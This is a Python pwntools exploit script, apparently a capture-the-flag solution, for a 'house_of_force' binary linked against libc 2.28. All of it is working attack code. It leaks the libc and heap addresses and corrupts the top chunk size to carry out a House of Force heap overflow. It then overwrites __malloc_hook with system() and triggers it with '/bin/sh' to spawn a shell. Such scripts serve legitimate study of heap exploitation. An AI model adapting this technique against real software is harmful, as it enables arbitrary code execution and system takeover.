#!/usr/bin/env python2.7


from pwn import *

BINARY = './house_of_force'
LIBC = './libc-2.28.so'
ADDR = 'localhost'
PORT = 4444

splash()
elf = context.binary = ELF(BINARY)
libc = ELF(LIBC, checksec=False)


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)

    if args.PWNDBG:
        context.log_level = 'debug'
        context.terminal = ['tmux', 'splitw', '-h']
        return gdb.debug(elf.path, gdbscript='''init-pwndbg''')

    else:
        return remote(ADDR, PORT)


def malloc(io, size, data):
    io.send("1")
    io.sendafter("size: ", str(size))
    io.sendafter("data: ", data)
    io.recvuntil("> ")


def solve():
    io = conn()

    io.recvuntil("puts() @ ")
    libc.address = int(io.recvline(), 16) - libc.sym.puts
    io.recvuntil("heap @ ")
    heap = int(io.recvline(), 16)
    log.info("puts() found at: " + hex(libc.sym.puts))
    log.info("libc base found at: " + hex(libc.address))
    log.info("system() found at: " + hex(libc.sym.system))
    bin_sh = next(libc.search("/bin/sh"))
    log.info("/bin/sh found at: " + hex(bin_sh))
    log.info("heap start address found at: " + hex(heap))
    log.info("__malloc_hook found at: " + hex(libc.sym.__malloc_hook))

    io.recvuntil("> ")
    io.timeout = 0.1
    data = [
        cyclic(24, n=8),
        0xffffffffffffffff
    ]
    malloc(io, 24, flat(data))

    distance = (libc.sym.__malloc_hook - 0x20) - (heap + 0x20)
    log.info("distance between top chunk and __malloc_hook is: " +
             hex(distance))

    malloc(io, distance, p64(0xdeadbeefcafebabe))
    malloc(io, 24, p64(libc.sym.system))
    malloc(io, bin_sh, "")

    io.interactive()


if __name__ == "__main__":
    solve()
